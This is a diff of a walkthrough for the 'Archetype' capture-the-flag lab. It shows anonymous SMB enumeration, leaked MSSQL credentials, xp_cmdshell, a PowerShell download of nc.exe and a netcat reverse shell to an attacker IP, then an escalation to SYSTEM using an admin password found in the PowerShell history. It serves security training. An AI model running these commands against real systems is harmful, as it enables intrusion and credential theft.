@@ -41,67 +41,67 @@ Enumerate misconfigured SMB shares to leak database credentials, use those crede
 **Step 1: Enumeration**
 An Nmap scan reveals multiple open ports, notably 445 (SMB) and 1433 (Microsoft SQL Server).
 
-![Nmap Scan](images/archetype.png)
+![Nmap Scan](../images/archetype.png)
 
 **Step 2: SMB Share Enumeration**
 We use `smbclient` with the `-N` flag (no password) to list available shares. We spot a non-administrative share named `backups`.
 
-![SMBclient Share List](images/archetype2.png)
+![SMBclient Share List](../images/archetype2.png)
 
 Connecting to the `backups` share, we run `ls` and find a file named `prod.dtsConfig`.
 
-![SMBclient List Share](images/archetype3.png)
+![SMBclient List Share](../images/archetype3.png)
 
 **Step 3: Leaking Credentials**
 We use the `get` command to download the `prod.dtsConfig` file to our local machine.
 
-![Download config file](images/archetype4.png)
+![Download config file](../images/archetype4.png)
 
 Reading the file with `cat`, we find a database connection string containing the credentials: `User ID=ARCHETYPE\sql_svc` and `Password=M3g4c0rp123`.
 
-![Read config file](images/archetype5.png)
+![Read config file](../images/archetype5.png)
 
 **Step 4: MSSQL Authentication & Code Execution**
 Armed with credentials, we use Impacket's `mssqlclient.py` to log into the database server. Our initial attempt to run standard OS commands like `ls` fails because we are in an SQL context.
 
-![MSSQL Login](images/archetype6.png)
+![MSSQL Login](../images/archetype6.png)
 
 To execute system commands, we must enable `xp_cmdshell`. We run `enable_xp_cmdshell` and verify execution by running `xp_cmdshell whoami`, which confirms we are running as `archetype\sql_svc`.
 
-![Enable xp_cmdshell](images/archetype7.png)
+![Enable xp_cmdshell](../images/archetype7.png)
 
 **Step 5: Reverse Shell Preparation**
 We set up a netcat listener on port 1337 (`nc -nvlp 1337`) to catch our incoming shell.
 
-![Netcat Listener](images/archetype8.png)
+![Netcat Listener](../images/archetype8.png)
 
-Next, we copy the Windows `nc.exe` binary to our working directory. 
+Next, we copy the Windows `nc.exe` binary to our working directory.
 
-![Copy nc.exe](images/archetype9.png)
+![Copy nc.exe](../images/archetype9.png)
 
 We start a Python HTTP server (`python -m http.server 8000`) so the target machine can download the netcat executable.
 
-![Python HTTP Server](images/archetype12.png)
+![Python HTTP Server](../images/archetype12.png)
 
 **Step 6: Uploading and Executing the Payload**
 Using `xp_cmdshell`, we invoke a PowerShell command to download `nc.exe` from our Python server and save it to the target's `Downloads` folder:
 `xp_cmdshell powershell -c Invoke-WebRequest -Uri http://10.10.15.164:8000/nc.exe -OutFile C:\Users\sql_svc\Downloads\nc.exe`
 
-![Upload netcat](images/archetype11.png)
+![Upload netcat](../images/archetype11.png)
 
 With the binary on the system, we execute it via `xp_cmdshell` to send a reverse shell to our listener:
 `xp_cmdshell C:\Users\sql_svc\Downloads\nc.exe -e cmd.exe 10.10.15.164 1337`
 
-![Execute netcat](images/archetype13.png)
+![Execute netcat](../images/archetype13.png)
 
 **Step 7: Catching the Shell & User Flag**
-Our netcat listener catches the connection, granting us a shell as `sql_svc`. 
+Our netcat listener catches the connection, granting us a shell as `sql_svc`.
 
-![Catch Shell](images/archetype14.png)
+![Catch Shell](../images/archetype14.png)
 
 Navigating to the user's Desktop, we retrieve the `user.txt` flag.
 
-![User Flag](images/archetype15.png)
+![User Flag](../images/archetype15.png)
 
 **Step 8: System Enumeration with WinPEAS**
 To systematically search for privilege escalation vectors, we can automate our enumeration using `winpeas`. By hosting the WinPEAS executable on our local Python HTTP server, we can download it directly to our target machine using the `sql_svc` shell. Running the script performs a comprehensive check of the system. Amidst its output, WinPEAS highlights the PowerShell console history file as a point of interest, providing us with the exact file path.
@@ -109,20 +109,20 @@ To systematically search for privilege escalation vectors, we can automate our e
 **Step 9: Privilege Escalation Reconnaissance**
 Following the path discovered by WinPEAS, we check the PowerShell history file located at `C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt`. Reading the file reveals that the Administrator previously mapped a network drive, exposing the password `MEGACORP_4dm1n!!` in cleartext.
 
-![PowerShell History](images/archetype16.png)
+![PowerShell History](../images/archetype16.png)
 
 **Step 10: Gaining SYSTEM Access & Root Flag**
 With the Administrator credentials in hand, we use Impacket's `psexec.py` to authenticate over SMB and spawn an interactive SYSTEM shell.
 
-![PsExec Login](images/archetype17.png)
+![PsExec Login](../images/archetype17.png)
 
 We navigate to the Administrator's Desktop.
 
-![Admin Desktop](images/archetype18.png)
+![Admin Desktop](../images/archetype18.png)
 
 Finally, we read the `root.txt` file to fully compromise the machine.
 
-![Root Flag](images/archetype19.png)
+![Root Flag](../images/archetype19.png)
 
 ## Key Learning
 Anonymous or poorly configured SMB shares often leak sensitive files like configuration backups. If these files contain database credentials, an attacker can authenticate to the backend server. Furthermore, leaving debugging or administrative features like `xp_cmdshell` enabled in MSSQL trivializes the jump from database access to full operating system command execution. For privilege escalation, automated enumeration tools like `winpeas` are invaluable for quickly identifying misconfigurations or sensitive files. Finally, administrators should be wary of typing cleartext credentials into PowerShell, as command history is logged by default in modern Windows environments.
